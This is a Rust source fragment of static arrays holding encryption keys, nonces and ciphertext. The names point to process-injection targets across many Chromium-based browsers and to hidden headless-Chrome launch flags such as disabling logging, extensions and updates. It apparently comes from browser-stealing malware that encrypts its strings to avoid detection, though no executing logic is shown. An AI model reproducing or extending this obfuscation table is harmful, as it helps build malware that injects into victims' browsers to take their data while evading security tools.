pub static INJ_NAME_OPERA_ENC: &[u8] = &[0xD3, 0xC3, 0x85, 0x22, 0xEE, 0xFB, 0x0D, 0x74, 0x9A, 0x5B, 0xA6, 0x46, 0xB8, 0x73, 0x7D, 0x2A, 0x18, 0x6D, 0x1A, 0x1E, 0x57];
pub static INJ_NAME_OPERA_GX_KEY: [u8; 32] = [0x13, 0x47, 0x09, 0x8E, 0x9B, 0xE7, 0xBF, 0xDA, 0xAE, 0x76, 0xD7, 0x6C, 0x62, 0x88, 0x13, 0x27, 0x11, 0x36, 0x93, 0xA1, 0x9E, 0x77, 0x30, 0x49, 0x62, 0x4D, 0x6E, 0xBC, 0x5B, 0x46, 0x93, 0x9E];
pub static INJ_NAME_OPERA_GX_NONCE: [u8; 12] = [0x7C, 0xDB, 0xC0, 0x69, 0x0C, 0x71, 0x11, 0xC9, 0x7D, 0xB8, 0x31, 0x96];
pub static INJ_NAME_OPERA_GX_ENC: &[u8] = &[0x0F, 0xBF, 0x60, 0x74, 0x12, 0x1B, 0x19, 0xF4, 0x7B, 0x66, 0x7D, 0xC7, 0x35, 0x57, 0x80, 0xD3, 0xD6, 0x9A, 0x65, 0xA7, 0x94, 0x26, 0xF5];
pub static INJ_NAME_OPERA_NEON_KEY: [u8; 32] = [0xD2, 0xD0, 0xD9, 0xD4, 0x03, 0xAD, 0x80, 0x50, 0xCF, 0x26, 0x5B, 0x80, 0x23, 0xDE, 0x35, 0xBE, 0x12, 0xA2, 0x76, 0x46, 0xDD, 0xDD, 0xC0, 0x01, 0x02, 0xEB, 0xC0, 0xF9, 0x72, 0x3D, 0x9F, 0x3F];
pub static INJ_NAME_OPERA_NEON_NONCE: [u8; 12] = [0x01, 0x98, 0x17, 0x46, 0x92, 0xE4, 0x04, 0x61, 0x72, 0x38, 0x35, 0xCD];
pub static INJ_NAME_OPERA_NEON_ENC: &[u8] = &[0xF8, 0x47, 0xC9, 0xD5, 0xD5, 0xAB, 0x41, 0xAA, 0x09, 0xDE, 0x35, 0xD7, 0x9D, 0xD1, 0x8C, 0xFE, 0xBA, 0x4E, 0x83, 0x76, 0x27, 0x35, 0x61, 0x4A, 0xAE, 0xCC];
pub static INJ_NAME_VIVALDI_KEY: [u8; 32] = [0xFE, 0xB1, 0xB7, 0xB3, 0xD5, 0x67, 0xB0, 0x71, 0x6B, 0xFB, 0xB7, 0xE3, 0x94, 0xBA, 0xF0, 0x05, 0xB3, 0x5B, 0xE1, 0x3F, 0x4D, 0xCD, 0xD0, 0x91, 0x37, 0xE8, 0xDD, 0x3C, 0xFD, 0x3C, 0x94, 0xFA];
pub static INJ_NAME_VIVALDI_NONCE: [u8; 12] = [0x4C, 0x8C, 0x86, 0xE4, 0x7B, 0x73, 0x8B, 0xFF, 0x32, 0xE6, 0x1E, 0x3E];
pub static INJ_NAME_VIVALDI_ENC: &[u8] = &[0xD3, 0xB2, 0xF6, 0xF7, 0x28, 0x65, 0xA6, 0x28, 0xFA, 0xBA, 0x5F, 0xA1, 0x95, 0xE6, 0x9D, 0x36, 0x82, 0x34, 0x1C, 0x87, 0x17, 0xFB, 0x00];
pub static INJ_NAME_YANDEX_KEY: [u8; 32] = [0xE8, 0xC1, 0xE6, 0xFC, 0x85, 0x90, 0x5C, 0x08, 0x66, 0x02, 0x85, 0x02, 0x0A, 0xE3, 0x0B, 0xAE, 0x45, 0x48, 0xB3, 0x8A, 0x2B, 0x74, 0xC3, 0x15, 0xAC, 0xC6, 0xF9, 0xB2, 0x91, 0x69, 0x00, 0x00];
pub static INJ_NAME_YANDEX_NONCE: [u8; 12] = [0xF7, 0x24, 0x90, 0x79, 0x94, 0xBB, 0xC7, 0xE3, 0x99, 0xC9, 0xDE, 0x7D];
pub static INJ_NAME_YANDEX_ENC: &[u8] = &[0xF7, 0x0A, 0xFB, 0x09, 0x8C, 0x06, 0x47, 0xBA, 0xF6, 0x4D, 0x0D, 0x01, 0x79, 0x91, 0xCD, 0xA1, 0x18, 0xE6, 0x99, 0xFA, 0x86, 0x02];
pub static INJ_NAME_COCCOC_KEY: [u8; 32] = [0x4B, 0xF4, 0x4A, 0xAB, 0x06, 0x05, 0x2B, 0x87, 0x05, 0x2A, 0xD3, 0xDF, 0xA3, 0xF1, 0x3C, 0x41, 0xC5, 0x45, 0x41, 0xA7, 0x55, 0xD4, 0x83, 0xD9, 0x4B, 0x8F, 0x0C, 0x42, 0x70, 0x3C, 0xF6, 0x2B];
pub static INJ_NAME_COCCOC_NONCE: [u8; 12] = [0xCD, 0x2D, 0xE5, 0x4B, 0xED, 0x63, 0x09, 0x19, 0x61, 0x9D, 0xD7, 0x7C];
pub static INJ_NAME_COCCOC_ENC: &[u8] = &[0xEF, 0x7F, 0xFE, 0x2B, 0x9C, 0xE3, 0x02, 0x90, 0x07, 0x57, 0xD3, 0xDC, 0xBE, 0x97, 0xC7, 0xD5, 0x24, 0xA9, 0x90, 0x90, 0x64, 0x65];
pub static INJ_NAME_CENT_KEY: [u8; 32] = [0xA9, 0x69, 0xD7, 0x88, 0x72, 0x22, 0x4F, 0xEB, 0xF4, 0x74, 0x7B, 0xF0, 0x8D, 0x89, 0xC0, 0x18, 0x69, 0x42, 0xB7, 0x50, 0x2B, 0xD6, 0x4E, 0xED, 0x14, 0x0A, 0x78, 0xA4, 0xE0, 0x7D, 0xC0, 0x68];
pub static INJ_NAME_CENT_NONCE: [u8; 12] = [0xAA, 0x0F, 0x57, 0x48, 0xBC, 0xED, 0xD1, 0x50, 0x5E, 0x31, 0x36, 0x39];
pub static INJ_NAME_CENT_ENC: &[u8] = &[0xD0, 0x53, 0x6D, 0xB2, 0xF8, 0x99, 0xD8, 0x18, 0x54, 0xE4, 0x31, 0xAC, 0xC0, 0x64, 0xE5, 0x37, 0x09, 0x67, 0x5F, 0x59, 0x65, 0xDA, 0xF0, 0x47, 0x33, 0x77, 0x1B];
pub static INJ_NAME_360CHROME_KEY: [u8; 32] = [0xF9, 0x0D, 0xC3, 0xEA, 0xC9, 0x09, 0x20, 0xEB, 0x11, 0xE1, 0xFB, 0xAD, 0x9E, 0xB7, 0xCA, 0x11, 0x0B, 0xD3, 0xA4, 0xE5, 0x15, 0xB2, 0x2C, 0xD0, 0xAC, 0x89, 0x8B, 0xAF, 0xC1, 0x38, 0x57, 0x2A];
pub static INJ_NAME_360CHROME_NONCE: [u8; 12] = [0xB8, 0x9D, 0x6F, 0xD8, 0xFA, 0x84, 0x69, 0x89, 0xF9, 0x9E, 0x92, 0x8B];
pub static INJ_NAME_360CHROME_ENC: &[u8] = &[0x39, 0xAD, 0x38, 0x6A, 0x02, 0x6A, 0xA3, 0xDA, 0x63, 0x55, 0x79, 0x6F, 0xB6, 0xA1, 0x8D, 0x5A, 0x61, 0x22, 0x2C, 0xB9, 0x58, 0xDE, 0xD1, 0x42, 0x32];
pub static INJ_NAME_EPIC_KEY: [u8; 32] = [0xF8, 0x33, 0xF6, 0x5E, 0xE1, 0x85, 0x5F, 0x66, 0x23, 0xA0, 0x16, 0xD3, 0xFE, 0xE2, 0x1D, 0x13, 0xC4, 0x58, 0x14, 0x1A, 0x20, 0x6F, 0x99, 0x29, 0xF8, 0x15, 0x5B, 0x85, 0xFC, 0x99, 0x02, 0x7D];
pub static INJ_NAME_EPIC_NONCE: [u8; 12] = [0xF6, 0x09, 0x64, 0x63, 0x77, 0xD0, 0x6C, 0xF9, 0xC5, 0x3C, 0xD9, 0x4C];
pub static INJ_NAME_EPIC_ENC: &[u8] = &[0xF0, 0x4C, 0x38, 0x39, 0x74, 0x97, 0x7B, 0x4C, 0x94, 0x3D, 0x00, 0xEF, 0xE9, 0x40, 0x1F, 0xB2, 0x7F, 0xFA, 0x60, 0xEA, 0x4A, 0x73, 0xC0, 0x7C, 0x46, 0xF4, 0xB9, 0x74, 0xBF, 0x10, 0x8D, 0x1F, 0xAB, 0xBA, 0x56, 0xF3];
pub static INJ_NAME_URAN_KEY: [u8; 32] = [0x9F, 0xE9, 0xA2, 0x58, 0xFA, 0x2F, 0xCA, 0x35, 0x6A, 0x26, 0xC0, 0x82, 0x1F, 0x31, 0x06, 0xF2, 0xBE, 0xEA, 0xB9, 0xA1, 0x37, 0x07, 0x4A, 0x90, 0x05, 0x5A, 0x9E, 0x64, 0x44, 0xB4, 0x41, 0x41];
pub static INJ_NAME_URAN_NONCE: [u8; 12] = [0x9C, 0x63, 0x4F, 0x61, 0xD7, 0xF6, 0x72, 0x2B, 0x6E, 0x81, 0xF4, 0x4A];
pub static INJ_NAME_URAN_ENC: &[u8] = &[0xAF, 0xAE, 0x02, 0x3C, 0x03, 0x69, 0x21, 0x10, 0x4D, 0xC8, 0xC6, 0xC5, 0x50, 0x2F, 0x4A, 0x30, 0x8B, 0x5E, 0x3F, 0x4D];
pub static INJ_NAME_7STAR_KEY: [u8; 32] = [0xA8, 0xFA, 0xC7, 0x60, 0x5D, 0x25, 0xF2, 0x82, 0x87, 0x35, 0x80, 0xAA, 0x67, 0xFA, 0xC4, 0x65, 0xA0, 0xC2, 0x0D, 0x1F, 0x4A, 0x48, 0x0A, 0xF7, 0x8E, 0x66, 0xCE, 0x84, 0x2D, 0x9C, 0x95, 0xBC];
pub static INJ_NAME_7STAR_NONCE: [u8; 12] = [0x23, 0x9F, 0xDB, 0x10, 0x2C, 0xC5, 0x68, 0x62, 0xED, 0x2F, 0xF3, 0x5F];
pub static INJ_NAME_7STAR_ENC: &[u8] = &[0x69, 0x81, 0xB0, 0x8F, 0x1F, 0xD0, 0x3D, 0xA5, 0x95, 0x4B, 0xEC, 0x2E, 0x76, 0xBE, 0x92, 0x35, 0x8B, 0x91, 0x4C, 0xF7, 0x69];
pub static INJ_NAME_TORCH_KEY: [u8; 32] = [0xE4, 0x5C, 0xDE, 0xF7, 0x60, 0xA1, 0x53, 0x2E, 0xA1, 0xB4, 0x28, 0x3E, 0x0E, 0x13, 0x63, 0xF8, 0x8C, 0x15, 0xD3, 0xE9, 0x80, 0x6B, 0x56, 0xBD, 0x1B, 0x5A, 0x31, 0x95, 0xF6, 0xFE, 0x73, 0x15];
pub static INJ_NAME_TORCH_NONCE: [u8; 12] = [0x9E, 0x02, 0x46, 0xB0, 0xC7, 0x7B, 0x27, 0xF7, 0xF9, 0x1E, 0xDE, 0xAE];
pub static INJ_NAME_TORCH_ENC: &[u8] = &[0xBD, 0xBE, 0xD4, 0x6A, 0x9B, 0x3A, 0x86, 0xD1, 0xDE, 0x6B, 0x67, 0x48, 0xB5, 0xF3, 0x2E, 0xF0, 0xFD, 0xF0, 0x83, 0x78, 0x87];
pub static INJ_NAME_KOMETA_KEY: [u8; 32] = [0xCF, 0xB6, 0xF1, 0xE4, 0x6D, 0x23, 0xFD, 0x2D, 0xD9, 0xE5, 0x71, 0x1C, 0x39, 0xFE, 0xA0, 0x44, 0xDE, 0x5E, 0x86, 0x34, 0xFC, 0x58, 0x1A, 0x1F, 0xAC, 0x09, 0x24, 0x9C, 0x07, 0x5F, 0x44, 0x71];
pub static INJ_NAME_KOMETA_NONCE: [u8; 12] = [0xDF, 0x19, 0x20, 0xC5, 0xEB, 0x75, 0x83, 0x41, 0x5B, 0x6D, 0x10, 0x0A];
pub static INJ_NAME_KOMETA_ENC: &[u8] = &[0x10, 0xBD, 0xA3, 0x73, 0x1C, 0x20, 0x25, 0xEC, 0xE3, 0x44, 0xF6, 0xD2, 0xD2, 0x20, 0x32, 0x2C, 0xA1, 0xE3, 0x41, 0xFD, 0xE5, 0xB4];
pub static INJ_NAME_ORBITUM_KEY: [u8; 32] = [0x2E, 0xDA, 0x7A, 0x12, 0x81, 0xA6, 0xE2, 0x74, 0x27, 0x13, 0x8E, 0x0E, 0xE7, 0x67, 0x45, 0xE4, 0xB5, 0xE3, 0xC2, 0x2F, 0x1D, 0x29, 0x15, 0x43, 0x06, 0xE5, 0xC9, 0xB2, 0xA6, 0x82, 0xCD, 0x23];
pub static INJ_NAME_ORBITUM_NONCE: [u8; 12] = [0xDE, 0x66, 0x30, 0xA1, 0x60, 0xA3, 0x75, 0xB1, 0x9F, 0x7A, 0x3B, 0xF2];
pub static INJ_NAME_ORBITUM_ENC: &[u8] = &[0xB2, 0x5E, 0x62, 0x74, 0x0F, 0x16, 0xBB, 0x61, 0x93, 0x01, 0xF7, 0xC8, 0x08, 0x11, 0x59, 0xCB, 0x5A, 0xAD, 0x87, 0xE0, 0x25, 0xD1, 0x15];
pub static INJ_NAME_AMIGO_KEY: [u8; 32] = [0xA0, 0x50, 0x80, 0x96, 0xCE, 0xAB, 0x66, 0xB9, 0x6D, 0x5D, 0x52, 0x08, 0x54, 0xA4, 0x83, 0xDA, 0x68, 0xC7, 0x7A, 0x1D, 0x95, 0x5E, 0x55, 0xD2, 0x19, 0xC8, 0x4A, 0x32, 0xBA, 0x62, 0x8A, 0x59];
pub static INJ_NAME_AMIGO_NONCE: [u8; 12] = [0x05, 0x6D, 0x2A, 0xD5, 0x66, 0xEB, 0x9D, 0x94, 0x1F, 0xD9, 0xB0, 0x11];
pub static INJ_NAME_AMIGO_ENC: &[u8] = &[0x4A, 0x92, 0xF0, 0x93, 0x11, 0xF2, 0x97, 0x82, 0x46, 0x3D, 0xCE, 0x25, 0xE9, 0x74, 0x7C, 0x97, 0x6D, 0x66, 0xF0, 0xFC, 0x6E];
pub static INJ_NAME_SPUTNIK_KEY: [u8; 32] = [0x82, 0x5A, 0x25, 0x4F, 0x0C, 0x96, 0x39, 0x89, 0x23, 0x60, 0xF9, 0x88, 0x09, 0x04, 0x59, 0xD5, 0x82, 0x58, 0xFE, 0x04, 0x6B, 0xA9, 0x56, 0xA4, 0x2E, 0xB1, 0x86, 0xF5, 0xB7, 0xFA, 0x01, 0xFC];
pub static INJ_NAME_SPUTNIK_NONCE: [u8; 12] = [0xDA, 0x3C, 0x05, 0xF2, 0x9F, 0x6E, 0x80, 0xE7, 0x03, 0xA2, 0x70, 0xFC];
pub static INJ_NAME_SPUTNIK_ENC: &[u8] = &[0xDE, 0x88, 0x4F, 0x1F, 0x14, 0x24, 0xA3, 0xC6, 0x66, 0x8A, 0x78, 0x8A, 0xF7, 0x53, 0xAA, 0x35, 0xCA, 0xA4, 0x1B, 0xC9, 0xD1, 0xBB, 0x07];
pub static INJ_NAME_SLIMJET_KEY: [u8; 32] = [0x71, 0x06, 0x31, 0xFC, 0x46, 0xF8, 0xF7, 0xB9, 0x4C, 0xCF, 0xF6, 0xE4, 0xBA, 0x12, 0x86, 0x4E, 0x81, 0x2B, 0x69, 0xBC, 0x0A, 0xF5, 0x19, 0x41, 0x9F, 0x88, 0xE7, 0x1C, 0x4D, 0xE6, 0x8C, 0xCA];
pub static INJ_NAME_SLIMJET_NONCE: [u8; 12] = [0x51, 0x31, 0x2A, 0xEE, 0xC9, 0xDB, 0x92, 0x42, 0xF7, 0xC8, 0x25, 0x15];
pub static INJ_NAME_SLIMJET_ENC: &[u8] = &[0xA3, 0x2D, 0xD0, 0x81, 0xFD, 0xB5, 0xE0, 0x05, 0x5E, 0x5F, 0xBE, 0xAA, 0xF8, 0x1A, 0xE9, 0x1B, 0x20, 0x2A, 0xD0, 0x5B, 0x1D, 0x97, 0xCA];
pub static INJ_NAME_IRIDIUM_KEY: [u8; 32] = [0x36, 0x31, 0x98, 0x46, 0x38, 0xC7, 0x1C, 0xCF, 0x84, 0x69, 0x6B, 0x2C, 0x23, 0x96, 0x82, 0x5D, 0xDA, 0x79, 0x1A, 0x77, 0xBC, 0x5C, 0xE0, 0xC0, 0x6E, 0x1D, 0x84, 0xEE, 0x7E, 0x8C, 0xF8, 0x07];
pub static INJ_NAME_IRIDIUM_NONCE: [u8; 12] = [0x48, 0x26, 0x38, 0xF3, 0xC1, 0xFC, 0x12, 0x94, 0xA7, 0x3C, 0x87, 0x14];
pub static INJ_NAME_IRIDIUM_ENC: &[u8] = &[0x4D, 0x99, 0x94, 0x81, 0x00, 0x6D, 0x61, 0x31, 0x03, 0x04, 0xE5, 0x4E, 0x9F, 0xC3, 0x32, 0xD8, 0x53, 0x2B, 0x3D, 0x48, 0x48, 0x98, 0x56];
pub static INJ_NAME_THORIUM_KEY: [u8; 32] = [0x7D, 0x32, 0x15, 0x99, 0x31, 0x21, 0xC1, 0xF8, 0x50, 0x9C, 0x76, 0xB3, 0x94, 0x8D, 0xF5, 0xED, 0x1E, 0x3F, 0x7F, 0xC4, 0x3B, 0x02, 0xEA, 0x84, 0xAD, 0x08, 0x2D, 0xD2, 0xDD, 0x0D, 0x9C, 0x3B];
pub static INJ_NAME_THORIUM_NONCE: [u8; 12] = [0x09, 0xDA, 0xF1, 0x06, 0x36, 0xC0, 0xBE, 0x9A, 0x63, 0x59, 0xA0, 0x31];
pub static INJ_NAME_THORIUM_ENC: &[u8] = &[0xA4, 0x48, 0xC0, 0x86, 0xC0, 0xCB, 0x50, 0x77, 0xD0, 0xED, 0xF6, 0xB6, 0xEF, 0xEF, 0x94, 0xE1, 0xAF, 0xC7, 0x69, 0xD9, 0x48, 0xF5, 0xDB];
pub static INJ_NAME_ARC_KEY: [u8; 32] = [0x04, 0x54, 0xCC, 0x4B, 0x50, 0x78, 0x93, 0xBA, 0x61, 0x38, 0xE8, 0x05, 0x54, 0x11, 0x39, 0xAE, 0xCE, 0x93, 0x1E, 0x2A, 0xD9, 0xB8, 0xDC, 0xBA, 0xCE, 0x5B, 0x87, 0xAB, 0x67, 0x6E, 0xB8, 0x9C];
pub static INJ_NAME_ARC_NONCE: [u8; 12] = [0xB2, 0x78, 0x56, 0xF5, 0xE5, 0x11, 0xB7, 0xFA, 0xC9, 0x39, 0x60, 0x08];
pub static INJ_NAME_ARC_ENC: &[u8] = &[0x7A, 0xE1, 0x40, 0x1F, 0xEB, 0x4F, 0xD0, 0x56, 0x5E, 0x7A, 0xD8, 0x74, 0x89, 0xB6, 0x8B, 0xB0, 0x1F, 0x4C, 0x5B];
pub static CHROME_FLAG_HEADLESS_KEY: [u8; 32] = [0xE2, 0x34, 0x5F, 0xC8, 0xBA, 0x79, 0xBD, 0x7B, 0x35, 0x9C, 0xAC, 0xA4, 0x34, 0xFF, 0x69, 0xE5, 0x60, 0x4F, 0xB1, 0x43, 0xDC, 0xA0, 0xCB, 0x73, 0x87, 0x0D, 0x18, 0xE2, 0x07, 0xBB, 0x44, 0xD3];
pub static CHROME_FLAG_HEADLESS_NONCE: [u8; 12] = [0x96, 0xE7, 0x44, 0xA1, 0x6C, 0x54, 0xE3, 0x0D, 0x99, 0x97, 0x0E, 0x21];
pub static CHROME_FLAG_HEADLESS_ENC: &[u8] = &[0xE3, 0x88, 0x62, 0x24, 0x80, 0xA2, 0xB0, 0x0E, 0x59, 0xAF, 0x14, 0x6D, 0xB8, 0x56, 0x84, 0x7C, 0x94, 0x2E, 0x02, 0x37, 0xF8, 0xF4, 0xD3, 0x21, 0x16, 0xBF, 0x74, 0x82, 0x65, 0xBD];
pub static CHROME_FLAG_NOGPU_KEY: [u8; 32] = [0xB5, 0xB8, 0x91, 0x95, 0x1B, 0x92, 0x09, 0x5A, 0x34, 0x6E, 0x08, 0xEE, 0x4E, 0x52, 0x38, 0x93, 0xFA, 0x03, 0xF8, 0x8E, 0x7B, 0x28, 0x0D, 0xAF, 0xAA, 0x08, 0xE6, 0x58, 0xA6, 0x63, 0x41, 0xAC];
pub static CHROME_FLAG_NOGPU_NONCE: [u8; 12] = [0x4B, 0x67, 0x31, 0x97, 0xDA, 0xA9, 0x92, 0x75, 0x1D, 0x09, 0xBA, 0xE7];
pub static CHROME_FLAG_NOGPU_ENC: &[u8] = &[0x40, 0xA2, 0x2B, 0x4D, 0xCF, 0xE3, 0xB0, 0x46, 0x22, 0x0D, 0xCA, 0x6C, 0x63, 0x8C, 0x56, 0x45, 0x12, 0x16, 0x93, 0x7F, 0xBF, 0xA8, 0xED, 0x41, 0x78, 0x0B, 0x52, 0xA2, 0xC9];
pub static CHROME_FLAG_NOLOG_KEY: [u8; 32] = [0x2B, 0x45, 0x7E, 0x12, 0x8D, 0x5D, 0x61, 0x0E, 0x51, 0x66, 0x6D, 0x5B, 0x5E, 0x31, 0x9D, 0x20, 0x1A, 0x98, 0x31, 0x24, 0xDC, 0x0A, 0xA3, 0xEF, 0xA1, 0x23, 0xE7, 0xBD, 0xEC, 0x7A, 0x12, 0xCC];
pub static CHROME_FLAG_NOLOG_NONCE: [u8; 12] = [0x73, 0x4D, 0x12, 0xE8, 0x88, 0x3B, 0xC7, 0x7E, 0x26, 0xE9, 0xF7, 0xD2];
pub static CHROME_FLAG_NOLOG_ENC: &[u8] = &[0xA3, 0xC6, 0x13, 0xDC, 0x84, 0xD1, 0x99, 0xAF, 0x67, 0xF7, 0xCD, 0xB5, 0xD6, 0x2D, 0x14, 0xF9, 0xD0, 0x8C, 0x32, 0xAE, 0x4E, 0xD8, 0x4B, 0xE4, 0x95, 0x72, 0x03, 0xD9, 0x47, 0xD9, 0xCF, 0x23, 0xFC];
pub static CHROME_FLAG_LOGLVL_KEY: [u8; 32] = [0x80, 0x3E, 0x24, 0x90, 0xC3, 0x1E, 0x53, 0x9F, 0x40, 0xDB, 0x7C, 0xEA, 0xF4, 0x1F, 0xD2, 0x7E, 0x2B, 0x76, 0xA0, 0x90, 0x8A, 0x6D, 0xDE, 0x21, 0xA3, 0x58, 0x20, 0x38, 0xEC, 0x3D, 0x18, 0xCC];
pub static CHROME_FLAG_LOGLVL_NONCE: [u8; 12] = [0xAE, 0x69, 0xC8, 0x11, 0xC2, 0x71, 0xBB, 0xEA, 0xDA, 0x96, 0x88, 0x40];
pub static CHROME_FLAG_LOGLVL_ENC: &[u8] = &[0xF6, 0x79, 0xA6, 0x93, 0xD4, 0x5A, 0x11, 0x3C, 0x2B, 0x11, 0xE5, 0x9A, 0xA7, 0xB0, 0x35, 0x31, 0xE9, 0xD8, 0x2E, 0x90, 0x4F, 0x65, 0x0C, 0xE0, 0x00, 0xC0, 0x13, 0x44, 0x16];
pub static CHROME_FLAG_NOBGNET_KEY: [u8; 32] = [0xC5, 0x0A, 0x78, 0xE5, 0x98, 0x67, 0xF9, 0x44, 0x45, 0xF6, 0x13, 0xCF, 0x22, 0xD7, 0x4F, 0x03, 0x7D, 0xAC, 0xAF, 0xEE, 0x3A, 0x1D, 0x48, 0x9C, 0x44, 0xE4, 0xBC, 0xC2, 0x66, 0x9D, 0xA4, 0xBA];
pub static CHROME_FLAG_NOBGNET_NONCE: [u8; 12] = [0x40, 0x77, 0x70, 0xB9, 0xC6, 0xD4, 0x48, 0xB3, 0x08, 0xD6, 0x7F, 0x75];
pub static CHROME_FLAG_NOBGNET_ENC: &[u8] = &[0xD7, 0xBF, 0x29, 0xCB, 0x27, 0x19, 0x44, 0xD3, 0x55, 0x51, 0x46, 0x21, 0x52, 0x32, 0xFC, 0x8F, 0x83, 0x69, 0x43, 0xD9, 0x87, 0x93, 0x30, 0x6A, 0x0F, 0xBD, 0x0A, 0xC3, 0x77, 0x30, 0x31, 0xFB, 0x01, 0xB7, 0x1E, 0x39, 0x7B, 0xDD, 0xB1, 0xC9, 0xBA, 0xEE, 0x99, 0xC8, 0x48, 0xA3, 0xDB];
pub static CHROME_FLAG_NOSYNC_KEY: [u8; 32] = [0x24, 0x1F, 0xA9, 0xBE, 0x05, 0x49, 0x2B, 0xEE, 0xC2, 0xA4, 0x90, 0x39, 0xB5, 0x4A, 0x0A, 0x2D, 0x71, 0x6A, 0x47, 0x31, 0xCA, 0xDB, 0xFE, 0x14, 0x79, 0x44, 0x47, 0x76, 0xC0, 0x7A, 0xC9, 0x81];
pub static CHROME_FLAG_NOSYNC_NONCE: [u8; 12] = [0x4F, 0x44, 0x45, 0x4A, 0xB2, 0xBA, 0x3E, 0x11, 0xB7, 0xC4, 0x00, 0x65];
pub static CHROME_FLAG_NOSYNC_ENC: &[u8] = &[0x2F, 0xC7, 0x90, 0x57, 0xE2, 0x78, 0xB6, 0x00, 0x93, 0xFE, 0x4F, 0xB7, 0xBF, 0xE4, 0x6D, 0x93, 0xE4, 0xBB, 0xAC, 0xB5, 0x4C, 0x41, 0xE3, 0x32, 0x5D, 0x97, 0x9A, 0x56, 0xEA, 0x96];
pub static CHROME_FLAG_NODEFA_KEY: [u8; 32] = [0x62, 0x2A, 0xFA, 0xFC, 0xFB, 0x68, 0xEB, 0x21, 0x5A, 0x55, 0xC1, 0x3E, 0x15, 0x70, 0x7F, 0x56, 0xE4, 0xB0, 0xFE, 0x31, 0x4E, 0xA6, 0xFE, 0x62, 0xD1, 0x27, 0xE8, 0x57, 0x75, 0x25, 0x14, 0xD2];
pub static CHROME_FLAG_NODEFA_NONCE: [u8; 12] = [0xD9, 0x3B, 0xCE, 0xC4, 0x04, 0x34, 0x15, 0xD3, 0x0B, 0xDB, 0x89, 0x71];
pub static CHROME_FLAG_NODEFA_ENC: &[u8] = &[0x22, 0xE3, 0xBB, 0xDD, 0x1A, 0x55, 0x4E, 0xC0, 0x2A, 0x07, 0xF8, 0x8F, 0x58, 0xCE, 0x4D, 0x21, 0xAB, 0xA1, 0xBC, 0x8A, 0x58, 0x08, 0xA9, 0xA7, 0x49, 0xE9, 0x47, 0x84, 0x84, 0xBC, 0x7A, 0xB6, 0x3D, 0x63, 0x44, 0xC9, 0x87, 0xD2];
pub static CHROME_FLAG_NOEXT_KEY: [u8; 32] = [0xA3, 0x65, 0x6E, 0x2C, 0x92, 0x37, 0x1C, 0x88, 0x8E, 0x86, 0x79, 0x73, 0x2B, 0xA4, 0xD7, 0xED, 0x1D, 0xC4, 0x00, 0x22, 0x89, 0x9C, 0xD6, 0xBB, 0xAB, 0x35, 0x6E, 0xD1, 0xF7, 0x72, 0x1E, 0x57];
pub static CHROME_FLAG_NOEXT_NONCE: [u8; 12] = [0x6C, 0x61, 0x1E, 0x08, 0xE3, 0x56, 0x06, 0x0F, 0xAE, 0x8E, 0x6B, 0x6E];
pub static CHROME_FLAG_NOEXT_ENC: &[u8] = &[0x27, 0x91, 0xB9, 0xBD, 0xD9, 0x39, 0xB7, 0x62, 0x45, 0x75, 0x0C, 0xD6, 0x56, 0x12, 0xF9, 0xC9, 0x7F, 0xE6, 0x04, 0x18, 0x63, 0xB8, 0x36, 0x0F, 0x70, 0x3F, 0xB2, 0xD1, 0x68, 0xE9, 0x18, 0x7F, 0x4D, 0x94, 0x18, 0x7A];
pub static CHROME_FLAG_NOUPDATE_KEY: [u8; 32] = [0x5C, 0xCD, 0xAF, 0xDF, 0x39, 0xAF, 0xDB, 0xFC, 0x53, 0x7D, 0x71, 0x87, 0xDB, 0xA1, 0x83, 0xA1, 0x33, 0xF7, 0xDD, 0xC5, 0xA3, 0xED, 0xC6, 0x07, 0x53, 0x25, 0x05, 0xE7, 0x5F, 0xEE, 0x93, 0xE2];
pub static CHROME_FLAG_NOUPDATE_NONCE: [u8; 12] = [0xDA, 0xBF, 0xCC, 0xFF, 0xB9, 0x12, 0xBF, 0xBC, 0x79, 0x9A, 0xD9, 0x02];
pub static CHROME_FLAG_NOUPDATE_ENC: &[u8] = &[0x8B, 0x52, 0x23, 0x89, 0x46, 0x40, 0x01, 0x3E, 0xA4, 0x12, 0xFE, 0x71, 0xA5, 0x81, 0xBA, 0xE6, 0x1A, 0x8D, 0x08, 0xDF, 0xC8, 0x9C, 0x4D, 0x52, 0x5F, 0xC9, 0x2F, 0x3B, 0x97, 0xCA, 0xB4, 0xD2, 0xAD, 0x3E, 0xF2, 0x63, 0xFC, 0x22, 0xDA, 0x44, 0xE4, 0xB4];
pub static CHROME_FLAG_NOFIRST_KEY: [u8; 32] = [0x1F, 0xF3, 0x8B, 0x77, 0x3F, 0xBF, 0xC4, 0x3B, 0x06, 0x6D, 0x0F, 0x38, 0xFC, 0xC6, 0x80, 0xD7, 0x0E, 0x9B, 0x53, 0x16, 0xD1, 0xA2, 0x91, 0xBC, 0x46, 0xFE, 0x0F, 0xFC, 0x8A, 0x91, 0x28, 0xA6];
pub static CHROME_FLAG_NOFIRST_NONCE: [u8; 12] = [0x3E, 0x10, 0xBB, 0x15, 0x2F, 0x2C, 0xA3, 0xF1, 0x00, 0xAE, 0xB4, 0x74];
pub static CHROME_FLAG_NOFIRST_ENC: &[u8] = &[0x9D, 0x3E, 0xEC, 0x8F, 0xAF, 0x61, 0x7D, 0x7F, 0x89, 0xCC, 0x07, 0xF0, 0x1D, 0x3D, 0x1E, 0xB1, 0x70, 0xD6, 0x32, 0x28, 0x01, 0x14, 0x04, 0xF5, 0xF2, 0x16, 0x9C, 0xD4, 0x5D, 0xC9];
pub static CHROME_FLAG_NODEFBR_KEY: [u8; 32] = [0xB5, 0xF2, 0x3B, 0xAB, 0x8B, 0x25, 0xED, 0xC1, 0xB7, 0x33, 0x26, 0xE5, 0x46, 0x73, 0xE8, 0xF3, 0x53, 0x8D, 0xB4, 0x82, 0xE4, 0x05, 0x19, 0x1C, 0x32, 0xC1, 0xC2, 0x99, 0x92, 0x4A, 0x64, 0xA7];
pub static CHROME_FLAG_NODEFBR_NONCE: [u8; 12] = [0x5A, 0x16, 0x2D, 0xC8, 0x8E, 0xC5, 0xEB, 0x4B, 0x7F, 0xE0, 0x7D, 0x98];
pub static CHROME_FLAG_NODEFBR_ENC: &[u8] = &[0x1E, 0xC1, 0xD7, 0xDA, 0xC3, 0xF3, 0xAC, 0xED, 0x91, 0xED, 0x3F, 0x76, 0xE8, 0xE2, 0x59, 0x9A, 0xFF, 0x62, 0x5D, 0xCA, 0xAB, 0xDD, 0x0F, 0x62, 0x6A, 0x95, 0x3F, 0xC3, 0xCC, 0x59, 0xC7, 0xA3, 0x80, 0x2F, 0x88, 0xBD, 0xDD, 0x78, 0xA8, 0x02, 0x7F, 0xAA];
